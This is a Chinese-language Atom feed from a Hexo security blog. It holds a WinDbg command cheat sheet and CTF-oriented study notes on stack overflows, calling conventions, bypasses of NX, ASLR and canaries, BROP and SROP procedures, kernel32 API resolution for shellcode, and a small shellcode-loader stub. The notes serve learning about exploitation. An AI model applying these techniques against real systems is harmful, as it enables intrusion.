<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>UyuniCat&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/b868ea52a14ccfbf43894e80aca59f74</icon>
  <subtitle>Welcome to my blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-06-12T06:00:02.840Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>UyuniCat</name>
    <email>uyunicat@protonmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《漏洞战争：软件漏洞分析精要》笔记</title>
    <link href="http://yoursite.com/2020/06/05/%E3%80%8A%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%EF%BC%9A%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B2%BE%E8%A6%81%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/06/05/%E3%80%8A%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%EF%BC%9A%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B2%BE%E8%A6%81%E3%80%8B%E7%AC%94%E8%AE%B0/</id>
    <published>2020-06-05T03:12:55.000Z</published>
    <updated>2020-06-12T06:00:02.840Z</updated>
    
    <content type="html"><![CDATA[<p>待更新</p><p>#</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;待更新&lt;/p&gt;
&lt;p&gt;#&lt;/p&gt;

      
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Windbg常用命令</title>
    <link href="http://yoursite.com/2020/06/03/Windbg%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2020/06/03/Windbg%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2020-06-03T03:30:47.000Z</published>
    <updated>2020-06-04T10:06:49.259Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windbg简介"><a href="#Windbg简介" class="headerlink" title="Windbg简介"></a>Windbg简介</h1><p>Windbg是Windows平台下的用户态和内核态的调试工具。Windbg不仅可以调试应用程序，还可以进行Kernel Debug，结合Microsoft的Symbol Server，可以获取系统符号文件，便于应用程序和内核的调试。</p><h1 id="Windbg常用命令"><a href="#Windbg常用命令" class="headerlink" title="Windbg常用命令"></a>Windbg常用命令</h1><p>Windbg命令分为标准命令、元命令和扩展命令。</p><ul><li>标准命令：提供最基本的调试功能，不区分大小写。 如：bp、g、dt等等</li><li>元命令：提供标准命令没有的功能，以”.”开头。 如：.sympath、.reload等等</li><li>扩展命令：用于扩展某一方面的调试功能，以”!”开头。 如：!analyze等等</li></ul><h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><ul><li>? ：显示标准命令</li><li>.help ：显示元命令</li><li>.hh ：显示帮助文件</li></ul><h2 id="调试命令"><a href="#调试命令" class="headerlink" title="调试命令"></a>调试命令</h2><ul><li>.attach [PID] ：附加到指定PID的进程上</li><li>.detach ：分离调试</li><li>.kill ：强制结束当前调试</li><li>q ：结束调试会话，回到基础工作空间，同时结束调试进程</li><li>qd ：结束调试会话，回到基础工作空间，但不结束调试进程</li><li>.restart ： 重启并调试</li></ul><h2 id="查看信息命令"><a href="#查看信息命令" class="headerlink" title="查看信息命令"></a>查看信息命令</h2><ul><li>version ：显示调试器版本信息和已加载的调试器扩展</li><li>vertarget ：显示目标机器的版本信息</li><li>CTRL+ALT+V ：打开/关闭Verbose（详细输出）模式</li><li>.cls ：清空屏幕</li><li>.lastevent ：显示最新的异常信息或事件信息</li><li>.time ：显示系统记录的各种时间</li><li>.echo “String” ：输出字符串</li></ul><h2 id="符号加载命令"><a href="#符号加载命令" class="headerlink" title="符号加载命令"></a>符号加载命令</h2><ul><li>ld [Module Name]：加载指定模块的符号</li><li>ln [address] :列出最近的符号</li><li>!sym ：获取符号加载状态</li><li>.sympath [symbol path]：显示[/设置]符号搜索路径</li><li>.symopt [+/- Flags] ：显示[/添加/移除]符号可选项</li><li>.symfix [DownstreamStore] ：设置符号库路径</li><li>x [Options] Module!symbol ：模式匹配符号信息<ul><li>x /t Module!symbol ：根据数据类型匹配</li><li>x /v Module!symbol ：显示详细信息</li><li>x /a Module!symbol ：按照地址排序</li><li>x /n Module!symbol ：按照名称排序</li><li>x /z Module!symbol ：按照大小排序</li><li>x *! Module!symbol ：列出所有模块</li><li>x ntdll!* ：列出 ntdll模块</li></ul></li><li>.reload ：重新加载符号信息</li></ul><h2 id="模块加载命令"><a href="#模块加载命令" class="headerlink" title="模块加载命令"></a>模块加载命令</h2><ul><li>lm ：显示已加载和未加载的模块信息</li><li>!dlls ：列出所有加载的模块和加载数量</li><li>!lmi [Module]：显示模块的详细信息</li></ul><h2 id="异常分析命令"><a href="#异常分析命令" class="headerlink" title="异常分析命令"></a>异常分析命令</h2><ul><li>!analyze ：显示当前异常的详细信息</li></ul><h2 id="进程信息命令"><a href="#进程信息命令" class="headerlink" title="进程信息命令"></a>进程信息命令</h2><ul><li>.tlist ：显示当前所有进程</li><li>!dml_proc ：通过DML方式显示当前进程的信息</li></ul><h2 id="线程信息命令"><a href="#线程信息命令" class="headerlink" title="线程信息命令"></a>线程信息命令</h2><ul><li>~ ：显示线程</li><li>~* ：显示所有线程</li><li>~. ：显示当前线程</li><li>!teb ：显示线程环境信息</li><li>!tls -1 ：显示当前线程所有的slot信息</li><li>!tls Slotdx ：显示指定的slot信息</li><li>.ttime ：显示线程时间信息</li><li>!runaway [0 | 1 | 2] ：显示每个线程消耗的时间[0:用户态时间 | 1：内核态时间 | 2：自线程创建起的时间间隔]</li><li>!gle ： 显示当前线程的最后错误</li></ul><h2 id="堆栈信息命令"><a href="#堆栈信息命令" class="headerlink" title="堆栈信息命令"></a>堆栈信息命令</h2><ul><li>k :显示当前调用堆栈</li><li>kd [WordCnt] ：显示原始栈数据和可能的符号信息</li><li>kn ：调用栈包含帧号</li><li>kf ：临近帧的距离</li><li>kL ：忽略源代码</li><li>kb ：最开始的 3 参数</li><li>kp ：所有的参数，包括参数类型、名称和值</li><li>kP ：所有的参数</li><li>kv ：FPO信息</li><li>kM ：使用DML格式显示堆栈信息</li><li>.kfremaes ：设置栈长度，默认20（0x14）</li><li>.frame ：显示当前帧</li><li>!uniqstack ：显示所有线程的栈信息</li><li>!findstack ：查找包含符号或模块的栈</li></ul><h2 id="断点信息命令"><a href="#断点信息命令" class="headerlink" title="断点信息命令"></a>断点信息命令</h2><ul><li>bl : 显示所有断点</li><li>bc * ：清除所有断点</li><li>be * ：启用所有断点</li><li>bp [address] ：在address处下断点</li><li>bp main ：在main函数下断点</li><li>bp @$exentry ： 在进程的入口下断点</li><li>bp MyDll+0x1010 ：在模块MyDll.dll偏移0x1010处下断点</li><li>bp `ConsoleTest.cpp:66` ：在ConsoleTest.cpp的66行处下断点</li><li>bp CSecondLoader::CSecondLoader ：在CSecondLoader的构造函数处下断点</li><li>bp TestCommon! CTest::test ：在TestCommon.dll的Test.cpp文件的CTest::test()函数起始处下断点</li></ul><h2 id="寄存器命令"><a href="#寄存器命令" class="headerlink" title="寄存器命令"></a>寄存器命令</h2><ul><li>r ：显示所有寄存器信息</li></ul><h2 id="查看变量命令"><a href="#查看变量命令" class="headerlink" title="查看变量命令"></a>查看变量命令</h2><ul><li>dt n ：查看局部变量n的类型与值</li><li>dv m ：查看函数变量m的值</li><li>dt ntdll!* ：查看ntdll里的所有类型信息</li></ul><h2 id="查看汇编命令"><a href="#查看汇编命令" class="headerlink" title="查看汇编命令"></a>查看汇编命令</h2><ul><li>u . ：反汇编当前eip寄存器地址的后8条指令</li><li>u $eip ：反汇编当前eip寄存器地址的后8条指令</li><li>ub . ：反汇编当前ip寄存器地址的前8条指令</li><li>ub $eip ：反汇编当前eip寄存器地址的前8条指令</li><li>u main+0x29 L30 ：反汇编main+0x29地址的后30条指令</li><li>u ：反编译下8条指令</li><li>uf CTest::add ：反汇编CTest类的add函数</li><li>uf /c main ：反汇编main函数，通过/c可以查看main函数中的函数调用(call)都有哪些</li><li>ub 000c123d L20 ：查看地址为000c123d指令前的20条指令内容</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Windbg简介&quot;&gt;&lt;a href=&quot;#Windbg简介&quot; class=&quot;headerlink&quot; title=&quot;Windbg简介&quot;&gt;&lt;/a&gt;Windbg简介&lt;/h1&gt;&lt;p&gt;Windbg是Windows平台下的用户态和内核态的调试工具。Windbg不仅可以调试应用程
      
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>二进制笔记</title>
    <link href="http://yoursite.com/2020/04/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/04/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%AC%94%E8%AE%B0/</id>
    <published>2020-04-15T11:23:38.000Z</published>
    <updated>2020-06-12T05:56:24.168Z</updated>
    
    <content type="html"><![CDATA[<h1 id="缓冲区溢出原理"><a href="#缓冲区溢出原理" class="headerlink" title="缓冲区溢出原理"></a>缓冲区溢出原理</h1><p>简单地说，缓冲区溢出就是在大缓冲区中的数据向小缓冲区复制的过程中，由于没有注意小缓冲区的边界，“撑爆”了较小的缓冲区，从而冲掉了和小缓冲区相邻内存区域的其他数据而引起的内存问题。</p><h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>不管什么样的操作系统、什么样的计算机架构，进程使用的内存都可以按照功能大致分成以下 4 个部分：</p><ul><li>代码区：这个区域存储着被装入执行的二进制机器代码，处理器会到这个区域取指并执行。</li><li>数据区：用于存储全局变量等。</li><li>堆区：进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。</li><li>栈区：用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行。</li></ul><p>栈：一种先进先出的数据结构，常用操作有入栈（PUSH）和出栈（POP）；用于标识栈属性的有栈顶（TOP）和栈底（BASE）</p><p>程序中的栈：</p><ul><li>内存中的一块区域，用栈的结构来管理，从高地址向低地址增长</li><li>寄存器ESP代表栈顶（即最低栈地址）</li><li>栈操作<ul><li>入栈 push eax -&gt; [esp]=eax, esp=esp-4</li><li>出栈 pop  eax -&gt; eax=[esp], esp=esp+4</li></ul></li><li>栈的目的是来保存函数调用信息和局部变量</li></ul><p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。<br>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。<br>EIP：指令寄存器(Extended Instruction Pointer)，其内存放着一个指针，该指针永远指向下一条等待执行的指令地址。</p><p>函数栈帧： ESP 和 EBP 之间的内存空间为当前栈帧， EBP 标识了当前栈帧的底部， ESP标识了当前栈帧的顶部。(关于栈帧的划分，不同参考书中有不同的约定。有的参考文献中把返回地址和前栈帧 EBP 值做为一个栈帧的顶部元素，而有的则将其做为栈帧的底部进行划分。)</p><p>在函数栈帧中，一般包含以下几类重要信息：</p><ul><li>局部变量：为函数局部变量开辟的内存空间。</li><li>栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本帧被弹出后恢复出上一个栈帧。</li><li>函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，以便在函数返回时能够恢复到函数被调用前的代码区中继续执行指令。</li></ul><p>函数调用指令：call ret<br>大致过程：</p><ul><li>参数入栈</li><li>返回地址入栈</li><li>代码区块跳转</li><li>栈帧调整：<ul><li>保存当前栈帧的状态值，为了后面恢复本栈帧时使用（EBP入栈）</li><li>将当前栈帧切换到新栈帧（ESP装入EBP，更新栈底）</li><li>给新栈分配空间（ESP减去所需空间的大小，抬高栈顶）</li></ul></li><li>相关指令：<ul><li>Call func -&gt; push pc <br><pre><code>-&gt; jmp func</code></pre></li><li>Leave -&gt; mov esp,ebp <br><pre><code>-&gt; pop ebp</code></pre></li><li>Ret -&gt; pop pc <br></li></ul></li></ul><p>调用方式之间的差异：<br>||C|SysCall|StdCall|Basic|FORTRAN|PASCAL|<br>:–: | :–: | :–: | :–: | :–: | :–:| :–:<br>参数入栈顺序|右→左| 右→左|右→左|左→右|左→右|左→右|<br>恢复栈平衡操作的位置|母函数|子函数|子函数|子函数|子函数|子函数|</p><p>函数调用约定：<br>调用约定的声明|函数入栈顺序|恢复栈平衡的位置<br>|:–: | :–: | :–: |<br>|<strong>cdecl|右→左|母函数|<br>|</strong>fastcall|右→左|子函数|<br>|__stdcall| 右→左|子函数|</p><p>如果要明确使用某一种调用约定，只需要在函数前加上调用约定的声明即可， 默认情况下， VC 会使用__stdcall 的调用方式</p><p>函数调用大致包括以下几个步骤：</p><ul><li>参数入栈：将参数从右向左依次压入系统栈中。</li><li>返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继续执行。</li><li>代码区跳转：处理器从当前代码区跳转到被调用函数的入口处。</li><li>栈帧调整：<ul><li>保存当前栈帧状态值，已备后面恢复本栈帧时使用（ EBP 入栈）；</li><li>将当前栈帧切换到新栈帧（将 ESP 值装入 EBP，更新栈帧底部）；</li><li>给新栈帧分配空间（把 ESP 减去所需空间的大小，抬高栈顶）；</li></ul></li></ul><p>对于__stdcall 调用约定，函数调用时用到的指令序列大致如下:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push arg3               ;参数从右向左依次入栈</span><br><span class="line">push arg2</span><br><span class="line">push arg1</span><br><span class="line">call function_address   ;call 指令将同时完成两项工作：</span><br><span class="line">                        ;a）向栈中压入当前指令在内存中的位置，即保存返回地址。</span><br><span class="line">                        ;b）跳转到所调用函数的入口地址函数入口处</span><br><span class="line">push ebp                ;保存旧栈帧底部</span><br><span class="line">mov ebp, esp            ;设置新栈帧底部(栈帧切换)</span><br><span class="line">sub esp, xxx            ;设置新栈帧顶部(抬高栈顶，为新栈帧开辟空间)</span><br></pre></td></tr></table></figure></div><p>类似地，函数返回的步骤如下。</p><ul><li>保存返回值：通常将函数的返回值保存在寄存器 EAX 中。</li><li>弹出当前栈帧，恢复上一个栈帧：<ul><li>在堆栈平衡的基础上，给 ESP 加上栈帧的大小，降低栈顶，回收当前栈帧的空间。</li><li>将当前栈帧底部保存的前栈帧 EBP 值弹入 EBP 寄存器，恢复出上一个栈帧。</li><li>将函数返回地址弹给 EIP 寄存器。</li></ul></li><li>跳转：按照函数返回地址跳回母函数中继续执行。</li></ul><p>以 C 语言和 Win32 平台为例，函数返回时的相关的指令序列如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add esp,xxx   ;降低栈帧，回收当前的栈帧</span><br><span class="line">pop ebp       ;将上一个栈帧底部位置恢复到ebp</span><br><span class="line">retn          ;这条指令有两个功能：</span><br><span class="line">              ;a)弹出当前栈顶元素，即弹出栈帧中的返回地址。至此，栈帧恢复工作完成。</span><br><span class="line">              ;b)让处理器跳转到弹出的返回地址，恢复调用前的代码区</span><br></pre></td></tr></table></figure></div><p>参数传参：取决于调用约定，一般情况下，x86 从右向左入栈，x64 优先寄存器，参数过多时才入栈</p><h2 id="栈溢出保护机制"><a href="#栈溢出保护机制" class="headerlink" title="栈溢出保护机制"></a>栈溢出保护机制</h2><ul><li>数据执行保护（NX/DEP）<ul><li>Bypass：ROP</li></ul></li><li>地址空间布局随机化（ASLR）<ul><li>Bypass：infoleak、retdlresolve、ROP</li></ul></li><li>Stack Canary/ Cookie<ul><li>Bypass：infoleak</li></ul></li></ul><h2 id="CTF常用的栈溢出利用方法"><a href="#CTF常用的栈溢出利用方法" class="headerlink" title="CTF常用的栈溢出利用方法"></a>CTF常用的栈溢出利用方法</h2><ul><li>现代栈溢出利用技术基础：ROP</li><li>利用singnal机制的ROP技术：SROP</li><li>没有binary怎么办：BROP、dump bin</li><li>劫持栈指针：stack pivot</li><li>利用动态链接绕过ASLR：ret2dl resolve、fake linkmap</li><li>利用地址低12bit绕过ASLR：Partial Overwrite</li><li>绕过stack canary：改写指针与局部变量、leak canary、overwrite canary</li><li>溢出位数不够怎么办：覆盖ebp、Partial Overwrite</li></ul><h2 id="Return2libc"><a href="#Return2libc" class="headerlink" title="Return2libc"></a>Return2libc</h2><p>r2libc技术是一种缓冲区溢出利用技术，主要用于克服常规缓冲区溢出漏洞利用技术中面临的no stack executable（NX）限制，该技术主要是通过覆盖栈帧中保存的函数返回地址(eip)，让其定位到libc库中的某个库函数(如，system等)，而不是直接定位到shellcode。然后通过在栈中精心构造该库函数的参数，以便达到类似于执行shellcode的目的</p><h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><p>一般情况下， ESP 寄存器中的地址总是指向系统栈中且不会被溢出的数据破坏。函数返回时， ESP 所指的位置恰好是我们所淹没的返回地址的下一个位置。<br>函数返回时， ESP 所指位置还与函数调用约定、返回指令等有关。例如， retn 3 与 retn 4 在返回后， ESP 所指的位置都会有所差异。</p><p>所有 win_32 程序都会加载 ntdll.dll 和 kernel32.dll 这两个最基础的动态链接库。如果想要<br>在 win_32 平台下定位 kernel32.dll 中的 API 地址，可以采用如下方法：</p><ul><li>首先通过段选择字 FS 在内存中找到当前的线程环境块 TEB。</li><li>线程环境块偏移位置为 0x30 的地方存放着指向进程环境块 PEB 的指针。</li><li>进程环境块中偏移位置为 0x0C 的地方存放着指向 PEB_LDR_DATA 结构体的指针，其中，存放着已经被进程装载的动态链接库的信息。</li><li>PEB_LDR_DATA 结构体偏移位置为 0x1C 的地方存放着指向模块初始化链表的头指针 InInitializationOrderModuleList。</li><li>模块初始化链表 InInitializationOrderModuleList 中按顺序存放着 PE 装入运行时初始化<br>模块的信息，第一个链表结点是 ntdll.dll，第二个链表结点就是 kernel32.dll。</li><li>找到属于 kernel32.dll 的结点后，在其基础上再偏移 0x08 就是 kernel32.dll 在内存中的<br>加载基地址。</li><li>从 kernel32.dll 的加载基址算起，偏移 0x3C 的地方就是其 PE 头。</li><li>PE 头偏移 0x78 的地方存放着指向函数导出表的指针。</li><li>至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址<ul><li>导出表偏移 0x1C 处的指针指向存储导出函数偏移地址（ RVA）的列表。</li><li>导出表偏移 0x20 处的指针指向存储导出函数函数名的列表。</li><li>函数的 RVA 地址和名字按照顺序存放在上述两个列表中，我们可以在名称列表中定位到所需的函数是第几个，然后在地址列表中找到对应的 RVA。</li><li>获得 RVA 后，再加上前边已经得到的动态链接库的加载基址，就获得了所需 API 此刻在内存中的虚拟地址，这个地址就是我们最终在 shellcode 中调用时需要的地址</li></ul></li></ul><p><a href="https://dblu3.github.io/img/0day2/shellcode_1.png" data-fancybox="group" data-caption="shellcode_1" class="fancybox"><img alt="shellcode_1" title="shellcode_1" data-src="https://dblu3.github.io/img/0day2/shellcode_1.png" class="lazyload"></a></p><p>由于 shellcode 需要漏洞程序已经初始化好了的进程空间和资源等，故往往不能单独运行。<br>为了能在实际运行中调试这样的机器码，我们可以使用这样一段简单的代码来装载 shellcode：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">char shellcode[]&#x3D;&quot;\x66\x81\xEC\40……&quot;; &#x2F;&#x2F;需要调试的shellcode的十六进制机器码</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    lea eax, shellcode</span><br><span class="line">    push eax</span><br><span class="line">    ret</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ret 指令会将 push 进去的 shellcode 在栈中的起始地址弹给 EIP，让处理器跳转到栈区去执行 shellcode。我们可以用这段装载程序运行搜集到的 shellcode，并调试之。 若搜集到的 shellcode不能满足需求，也可以在调试的基础上稍作修改，为它增加新功能。</p><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>ROP（Return oriented programming）</p><h2 id="基础ROP"><a href="#基础ROP" class="headerlink" title="基础ROP"></a>基础ROP</h2><p>推荐蒸米的一步步学ROP系列</p><h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><p>BROP（Blind Return Oriented Programming）</p><h3 id="BROP攻击前提"><a href="#BROP攻击前提" class="headerlink" title="BROP攻击前提"></a>BROP攻击前提</h3><ul><li>必须先存在一个已知的stack overflow的漏洞，而且攻击者知道如何触发这个漏洞</li><li>服务器进程在crash之后会重新复活，并且复活的进程不会被re-rand（意味着虽然有ASLR的保护，但是复活的进程和之前的进程的地址随机化是一样的）</li></ul><h3 id="BROP攻击流程"><a href="#BROP攻击流程" class="headerlink" title="BROP攻击流程"></a>BROP攻击流程</h3><ol><li><p>如果有canary防护，需要通过brute-force（低效，不推荐）或者”stack reading”</p><ul><li>stack reading：我们可以尝试任意多次来判断出overflow的长度（直到进程由于canary被破坏crash了，在这里即为4096+8=4104个字节），之后我们将这4096个字节填上任意值，然后一个一个字节顺序地进行尝试来还原出真实的canary，比如说，我们将第4097个字节填为x，如果x和原来的canary中的第一个字节是一样的话，那么进程不会crash，否则我们尝试下一个x的可能性，在这里，由于一个字节只有256种可能，所以我们只要最多尝试256次就可以找到canary的某个正确的字节，直到我们得到8个完整的canary字节。可以用这种方法来得到保存好的frame pointer和return address。</li></ul></li><li><p>寻找stop gadget（hang gadget），使攻击者保持连接状态</p><ul><li>stop gadget:一般情况下，如果我们把栈上的return address覆盖成某些我们随意选取的内存地址的话，程序有很大可能性会挂掉（比如，该return address指向了一段代码区域，里面会有一些对空指针的访问造成程序crash，从而使得攻击者的连接（connection）被关闭）。但是，存在另外一种情况，即该return address指向了一块代码区域，当程序的执行流跳到那段区域之后，程序并不会crash，而是进入了无限循环，这时程序仅仅是hang在了那里，攻击者能够一直保持连接状态。一般情况下这会是一个在PLT中的blocking系统调用的地址（sleep等），于是，我们把这种类型的gadget，成为stop gadget。</li></ul></li><li><p>寻找可利用的gadget（potentially useful gadgets），这里需要找不会crash的gadgets</p><ul><li>假设现在我们猜到某个useful gadget，比如pop rdi; ret, 但是由于在执行完这个gadget之后进程还会跳到栈上的下一个地址，如果该地址是一个非法地址，那么进程最后还是会crash，在这个过程中攻击者其实并不知道这个useful gadget被执行过了（因为在攻击者看来最后的效果都是进程crash了），因此攻击者就会认为在这个过程中并没有执行到任何的useful gadget，从而放弃它</li><li>如果我们有了stop gadget，那么整个过程将会很不一样. 如果我们在需要尝试的return address之后填上了足够多的stop gadgets。那么任何会造成进程crash的gadget最后还是会造成进程crash，而那些useful gadget则会进入block状态。尽管如此，还是有一种特殊情况，即那个我们需要尝试的gadget也是一个stop gadget，那么如上所述，它也会被我们标识为useful gadget。不过这并没有关系，因为之后我们还是需要检查该useful gadget是否是我们想要的gadget。</li></ul></li><li><p>远程dump内存（条件允许的话，利用格式化字符串会方便很多），需要一个write的系统调用，传入一个socket文件描述符。<code>write (int sock, void *buf, int len)</code>转换成汇编</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop %rdi ret   ;%rdi对应sock</span><br><span class="line">pop %rsi ret   ;%rsi对应buf</span><br><span class="line">pop %rdx ret   ;%rdx对应len</span><br><span class="line">call write ret</span><br></pre></td></tr></table></figure></div><ul><li>在栈上构造好这4个gadget的内存地址，依次执行顺序调用即可</li><li><code>pop %rdi ret</code>和<code>pop %rsi ret</code>只需要找到BROP gadget即可</li><li>如果dump内存时难以找到<code>pop %rdx ret</code>这样的gadget，可以利用strcmp函数达到同样的效果，strcmp和write调用都可以在PLT（Procedure Linking Table）里面找到</li></ul></li></ol><p>接下来就只需要：</p><ul><li><p>寻找BROP gadget</p><ul><li>BROP gadget需要顺序地从站上pop6个值然后ret，那么我们可以在stop gadget之前天上6个会造成crash的地址，如果某个useful gadget满足这个条件且不会crash，那么它基本上就是BROP gadgets</li></ul></li><li><p>找到对应的PLT项</p><ul><li><p>如果有很多条连续的16字节对齐的地址都不会造成crash，而且这些地址+6得到的地址也不会造成crash，那么这很有可能就是某个PLT对应的项了</p></li><li><p>得到PLT表后判断strcmp和write：通过传入不同的参数组合，根据返回的结果进行判断</p></li><li><p>strcmp会发生如下的可能性：</p></li></ul><table><thead><tr><th align="center">arg1</th><th align="center">arg2</th><th align="center">result</th></tr></thead><tbody><tr><td align="center">readable</td><td align="center">0x0</td><td align="center">crash</td></tr><tr><td align="center">0x0</td><td align="center">readable</td><td align="center">crash</td></tr><tr><td align="center">0x0</td><td align="center">0x0</td><td align="center">crash</td></tr><tr><td align="center">readable</td><td align="center">readable</td><td align="center">nocrash</td></tr></tbody></table><ul><li><p>判断write调用：通过检查所有的PLT项，触发其向某个socket写数据来检查write是否被调用，如果write被调用，本地可以看到传过来的内容</p></li><li><p>确定socket文件描述符：方法一：同时调用多次write，把它们串起来，传入不同的文件描述符数；方法二：同时打开多个连接，使用一个相对较大的文件描述符数字，增加匹配的可能性</p></li></ul></li></ul><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>SROP（Sigreturn Oriented Programming）,系统Signal Dispatch之前会将所有寄存器入栈，然后调用signal handler，signal handler返回时会将栈的内容还原到寄存器。如果事先填充栈，接着调用signal handler,在返回时便可以控制寄存器的值了。</p><h3 id="signal的调用流程"><a href="#signal的调用流程" class="headerlink" title="signal的调用流程"></a>signal的调用流程</h3><ol><li>内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（spend）</li><li>内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应的signal</li><li>signal handler返回内核</li><li>内核为该进程恢复之前保存的上下文，最后恢复进程的执行</li></ol><h3 id="SROP的攻击流程"><a href="#SROP的攻击流程" class="headerlink" title="SROP的攻击流程"></a>SROP的攻击流程</h3><table><thead><tr><th></th><th>stack</th><th></th><th>code</th></tr></thead><tbody><tr><td>sp-&gt;</td><td></td><td>ip-&gt;</td><td>User code</td></tr><tr><td></td><td></td><td></td><td>signal handler</td></tr><tr><td></td><td></td><td></td><td>sigreturn</td></tr></tbody></table><ol><li>内核发起signal</li><li>栈还未push，ip仍然在User code</li><li>数据push到栈中</li><li>将sigreturn syscall的位置push进栈</li><li>ip从User code跳转到signal handler</li><li>从signal handler返回</li><li>ip跳转到sigreturn</li><li>执行sigreturn syscall</li><li>stack上的所有内容pop回register，ip回到User code</li></ol><h3 id="SROP的攻击条件"><a href="#SROP的攻击条件" class="headerlink" title="SROP的攻击条件"></a>SROP的攻击条件</h3><ol><li>可以通过stack overflow控制栈上的内容</li><li>需要知道栈的地址（比如自己构造的/bin/sh的地址）</li><li>需要知道syscall在内存中的地址</li><li>需要知道sigreturn系统调用的内存地址</li></ol><h2 id="Return-to-dl-resolve"><a href="#Return-to-dl-resolve" class="headerlink" title="Return-to-dl-resolve"></a>Return-to-dl-resolve</h2><h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><p>堆（heap）是一种基本的数据结构，可以由开发人员自行分配、释放。堆从低地址向高地址扩展的，它们都是不连续的内存区域。系统通过链表对空闲的内存块进行管理、堆也是不连续的，链表从低地址向高地址遍历。</p><p>堆溢出是堆里面的变量赋予超过了其分配的空间大小的值，堆链表的后续链表数据被覆盖导致的。</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h2 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h2><h2 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h2><h2 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use-After-Free"></a>Use-After-Free</h2><h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h1 